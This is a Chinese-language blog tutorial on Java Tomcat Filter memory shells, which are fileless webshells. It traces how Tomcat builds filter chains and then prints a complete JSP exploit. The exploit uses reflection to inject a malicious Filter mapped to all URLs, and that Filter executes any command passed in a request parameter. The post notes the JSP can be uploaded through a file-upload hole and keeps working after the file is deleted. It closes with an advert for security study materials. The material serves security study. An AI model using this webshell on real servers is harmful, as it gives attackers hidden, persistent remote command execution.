# 原创
：  java Filter内存马分析

# java Filter内存马分析

**知识基础：**

刚开始内存马的这块学习与反序列化并无太大关系，反而与javaweb，tomcat联系更加紧密。所以在学习内存马之前需要先了解JSP，java web的三大件，Servlet，Filter，Listener的基本知识和工作流程和Tomcat 架构的相关内容。

### 0x01 什么是Filter马

内存马就是无文件木马，无文件落地，它通常会存在进程，内存或者java虚拟机中，特点更加隐蔽，难以排查，并且也难以删除。而今天学习的Filter内存马是传统web应用型内存马，主要将恶意代码注入到过滤器中，当过滤器拦截servlet请求的参数时，过滤器中的恶意代码就会执行。

### 0x02 环境搭建

首先配置一个 servlet 的web项目，<br/>  

<br/> 然后一直点下一步就好了，它会自动帮我们生成一个简单的servlet<br/> pom.xml中导入tomcat相关依赖

```
&lt;dependency&gt;
            &lt;groupId&gt;org.apache.tomcat&lt;/groupId&gt;
            &lt;artifactId&gt;tomcat-catalina&lt;/artifactId&gt;
            &lt;version&gt;9.0.38&lt;/version&gt;
            &lt;scope&gt;provided&lt;/scope&gt;
        &lt;/dependency&gt;
        &lt;dependency&gt;
            &lt;groupId&gt;org.apache.tomcat&lt;/groupId&gt;
            &lt;artifactId&gt;tomcat-websocket&lt;/artifactId&gt;
            &lt;version&gt;9.0.38&lt;/version&gt;
        &lt;/dependency&gt;

```

方便之后调试代码，在这之后我们创建一个自定义的Filter过滤器

```
package com.example.memoryhorse;
import javax.servlet.*;
import java.io.IOException;

public class MyFilter implements Filter{
    @Override
    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
        System.out.println("执行过滤功能");
        servletRequest.setCharacterEncoding("utf-8");
        servletResponse.setCharacterEncoding("utf-8");
        servletResponse.setContentType("text/html;charset=UTF-8");
        filterChain.doFilter(servletRequest,servletResponse);
        System.out.println(servletRequest.getParameter("cmd"));
        Runtime.getRuntime().exec(servletRequest.getParameter("cmd"));
    }
}

```

重写了doFilter方法，里面添加恶意代码，接收cmd参数，执行任意命令。web.xml中配置相关参数

```
&lt;filter&gt;
    &lt;filter-name&gt;MyFilter&lt;/filter-name&gt;
    &lt;filter-class&gt;com.example.memoryhorse.MyFilter&lt;/filter-class&gt;
&lt;/filter&gt;
&lt;filter-mapping&gt;
    &lt;filter-name&gt;MyFilter&lt;/filter-name&gt;
    &lt;url-pattern&gt;/MyFilter&lt;/url-pattern&gt;
&lt;/filter-mapping&gt;

```

这里我定义的是/MyFilter路由，在访问这个路由时，就会被我们自定义的过滤器拦截

### 0x03 Filter内存马探索

这个时候是不是就有点像内存马的样子，我们注册了一个恶意的 /MyFilter 路由，访问这个路由可以执行任意代码。测试一下<br/>  

<br/> 成功弹出计算器，这也是注入Filter内存马的一个抽象的体现。然而在实际攻防场景中，我们不可能在别人服务器上插入自己自定义的过滤器，web.xml这个配置文件也不是那么容易修改，就算修改了配置文件也很好排查，起不到隐秘的效果，要想动态的注册Filter马，就必须弄清楚过滤器的创建和调用过程。

##### 1.tomcat Filter 的流程分析

在MyFilter的doFilter方法里下个断点，访问/MyFilter路由，会被我们自定义的过滤器拦截，doFilter方法是处理过滤功能的方法，开始调试<br/>  

<br/> 这个filterChain是一个过滤器链，通过调试看到里面存放着两个过滤器，一个是我们自定义的，一个是 tomcat 自带的，跟进它的doFilter方法<br/> 判断 Globals.IS_SECURITY_ENABLED 安全模式是否开启，这里判断false，<br/>  

<br/> 跟进 internalDoFilter 方法<br/>  

<br/> filters 是过滤器链数组，取数组的下标，遍历过滤器，赋值给filterConfig<br/>  

<br/> 此时的过滤器为WsFilter 调用它的doFilter方法，跟进看一下<br/>  

<br/> 这里的判断 是否满足WebSocket握手的特殊条件，而且是否已经配置了相应的类来处理WebSocket连接，如果两个都不满足，然后回调用过滤器链中的下一个过滤器。继续跟进<br/> 又回到了 internalDoFilter 方法，此时pos=2，不满足if条件。也就是说当过滤器遍历完后，就会调用 service 方法处理具体的业务请求<br/>  

<br/> 事实上可以定义多个过滤器，当拦截请求后，从filterChain 中一个个调用doFilter方法，最终执行 service 方法<br/> 那么Filter链是怎么一步步创建的，我们要注册一个恶意的Filter进去就需要了解Filter链的创建过程<br/>  

<br/> 通过执行流可以看到不断调用 invoke 方法，跟进最后一个 invoke方法，也就是 StandardWrapperValve 类的 invoke 方法，<br/>  

<br/> 这里已经创建好了 Filter链，往上翻代码，<br/>  

<br/> createFilterChain 就是创建Filter链的重要方法，进入到这个方法下个断点，开始调试<br/>  

<br/> 这里实例化一个filterChain，设置了当前过滤器链中的 Servlet，然后获取当前 Servlet 包含在的上下文，从调式信息就可以看到是 StandardContext 对象，最后定义一个filterMaps 获取了当前上下文中的过滤器映射<br/>  

<br/> 此时的filterMaps就获取到了两个过滤器，到后面会对filterMaps进行两次遍历<br/> 这段代码的目的是将根据 URL 和 Servlet 名称匹配的过滤器配置添加到过滤器链中，以确保在请求处理过程中应用适当的过滤器。匹配过滤器配置时，会检查 Dispatcher 类型、URL 和 Servlet 名称，然后将匹配的过滤器配置添加到过滤器链中。如果没有匹配的过滤器配置，继续处理下一个过滤器映射<br/>  

<br/> filterConfig 是通过调用context上下文的findFilterConfig方法获取，filterConfigs是一个Map，从里面拿<br/>  

<br/> 最后通过 addFilter 方法将过滤器添加到链中。

##### 2.攻击思路分析

过滤器是从filterConfigs这个Map里拿的，那么我们把恶意的Filter添加进 filterConfigs 里，等它取出来，添加到Filter链中就可以了，那么接下来怎么构造过滤器，也就是filterConfig，看调试信息<br/>  

<br/> 首先获取上下文context，然后就是自定义的filter代码，最后一个filterDef就是对应web.xml中对filter的配置，fiterConfig的相关内容都是从context中得到

FilterDefs：存放 FilterDef 的数组 ，FilterDef 中存储着我们过滤器名，过滤器实例等基本信息<br/> FilterConfigs：存放 filterConfig 的数组，在 FilterConfig 中主要存放 FilterDef 和Filter 对象等信息<br/> FilterMaps：存放 FilterMap 的数组，在 FilterMap 中主要存放了 FilterName 和 对应的 URLPattern

所以只要我们将filter ，FilterDefs，FilterMaps添加到FilterConfigs中就可以添加filter了<br/> 贴上别的师傅的流程图<br/>  

<br/> 其中这里涉及到了几个类

```
ServletContext：
javax.servlet.ServletContextServlet规范中规定了的一个ServletContext接口，提供了Web应用所有Servlet的视图，通过它可以对某个Web应用的各种资源和功能进行访问。WEB容器在启动时，它会为每个Web应用程序都创建一个对应的ServletContext，它代表当前Web应用。并且它被所有客户端共享。 

ApplicationContext：
org.apache.catalina.core.ApplicationContext
对应Tomcat容器，为了满足Servlet规范，必须包含一个ServletContext接口的实现。Tomcat的Context容器中都会包含一个ApplicationContext。

StandardContext：
Catalina主要包括Connector和Container，StandardContext就是一个Container，它主要负责对进入的用户请求进行处理。实际来说，不是由它来进行处理，而是交给内部的valve处理。
一个context表示了一个外部应用，它包含多个wrapper，每个wrapper表示一个servlet定义。（Tomcat 默认的 Service 服务是 Catalina）

```

引用师傅的解释，当前这是前面tomcat架构的内容，所以基础内容还是要了解。

### 0x04 Filter内存马exp编写

通过反射创建上面需要的几个对象

```
&lt;%@ page import="java.lang.reflect.Field" %&gt;
&lt;%@ page import="org.apache.catalina.Context" %&gt;
&lt;%@ page import="org.apache.tomcat.util.descriptor.web.FilterMap" %&gt;
&lt;%@ page import="java.lang.reflect.Constructor" %&gt;
&lt;%@ page import="org.apache.catalina.core.ApplicationFilterConfig" %&gt;
&lt;%@ page import="org.apache.tomcat.util.descriptor.web.FilterDef" %&gt;
&lt;%@ page import="org.apache.catalina.core.ApplicationContextFacade" %&gt;
&lt;%@ page import="org.apache.catalina.core.ApplicationContext" %&gt;
&lt;%@ page import="org.apache.catalina.core.StandardContext" %&gt;
&lt;%@ page import="java.util.HashMap" %&gt;
&lt;%@ page import="java.io.IOException" %&gt;
&lt;%


//请求对象 request 中获取 ServletContext 对象。
    ServletContext servletContext = request.getServletContext();
//ApplicationContextFacade 是 Spring 框架中的一个类，用于封装 Spring 的 Web 应用程序上下文。
    ApplicationContextFacade applicationContextFacade = (ApplicationContextFacade) servletContext;
//通过反射获取上下文
    Field applicationContextFacadeContext = applicationContextFacade.getClass().getDeclaredField("context");
    applicationContextFacadeContext.setAccessible(true);


// context 字段，即 Spring 的应用程序上下文对象。通过反射获取到该字段的值，它被强制转换为 ApplicationContext 类型
    ApplicationContext applicationContext = (ApplicationContext) applicationContextFacadeContext.get(applicationContextFacade);
//从 ApplicationContext 类中获取一个名为 "context" 的私有字段。这个字段存储了实际的 Spring 应用程序上下文对象
    Field applicationContextContext = applicationContext.getClass().getDeclaredField("context");
    applicationContextContext.setAccessible(true);
    //类型转换standardContext，标准的web应用程序上下文
    StandardContext standardContext = (StandardContext) applicationContextContext.get(applicationContext);


    //创建filterConfigs
    Field filterConfigs = standardContext.getClass().getDeclaredField("filterConfigs");
    filterConfigs.setAccessible(true);
    HashMap hashMap = (HashMap) filterConfigs.get(standardContext);
    String filterName = "Filter";
    if (hashMap.get(filterName)==null){
        //构造filter对象
        Filter filter = new Filter() {
            @Override
            public void init(FilterConfig filterConfig) throws ServletException {
                System.out.println("filter初始化");
            }
            @Override
            public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
                servletRequest.setCharacterEncoding("utf-8");
                servletResponse.setCharacterEncoding("utf-8");
                servletResponse.setContentType("text/html;charset=UTF-8");
                filterChain.doFilter(servletRequest,servletResponse);
                System.out.println(servletRequest.getParameter("shell"));
                Runtime.getRuntime().exec(servletRequest.getParameter("shell"));
                System.out.println("执行过滤");
            }
            @Override
            public void destroy() {
            }
        };
        //构造filterDef对象
        FilterDef filterDef = new FilterDef();
        filterDef.setFilter(filter);
        filterDef.setFilterName(filterName);
        filterDef.setFilterClass(filter.getClass().getName());
        //将过滤器的配置信息添加到应用程序上下文中
        standardContext.addFilterDef(filterDef);


        //构造filterMap对象
        FilterMap filterMap = new FilterMap();
        //添加映射的路由为所有请求
        filterMap.addURLPattern("/*");
        filterMap.setFilterName(filterName);
        filterMap.setDispatcher(DispatcherType.REQUEST.name());
        //将上述设置好的过滤器映射对象添加到 StandardContext 中，并将其插入到已有的过滤器映射之前
        standardContext.addFilterMapBefore(filterMap);


        //构造filterConfig
        Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);
        constructor.setAccessible(true);
        ApplicationFilterConfig applicationFilterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);


        //将filterConfig添加到filterConfigs中，即可完成注入
        hashMap.put(filterName,applicationFilterConfig);
        response.getWriter().println("注入完成");
    }
%&gt;

```

为什么要写jsp文件，因为在实际场景中，可以通过文件上传漏洞将这个jsp马上传上去完成内存马的注入。注释上写了，分步编写exp。<br/>  

<br/> 注入成功后，我们对服务器访问任何请求，都会执行恶意代码。而且当jsp文件删除后，木马仍然有效。它存在当前的web应用上下文中，所以重启服务器就没了。

**没看够~？欢迎关注！**

## **免费领取安全学习资料包！**<img alt="" height="768" src="https://img-blog.csdnimg.cn/direct/8b30746904c44303a277371c4bacd219.png" width="1024"/>

渗透工具

技术文档、书籍

<img alt="" height="516" src="https://img-blog.csdnimg.cn/direct/509b4a1ac58a4a51881f6532ddf4b15c.png" width="852"/> <img alt="" height="523" src="https://img-blog.csdnimg.cn/direct/de384b2353ca4a8a89677d1907770a4d.png" width="856"/>

面试题

帮助你在面试中脱颖而出

视频

基础到进阶

环境搭建、HTML，PHP，MySQL基础学习，信息收集，SQL注入,XSS，CSRF，暴力破解等等

<img alt="" height="481" src="https://img-blog.csdnimg.cn/direct/ed27be20be70442e9e46c834f4ceb7f0.png" width="694"/> <img alt="" height="77" src="https://img-blog.csdnimg.cn/direct/092df22d98c14eeda52071821977edc2.png" width="665"/>

应急响应笔记

学习路线
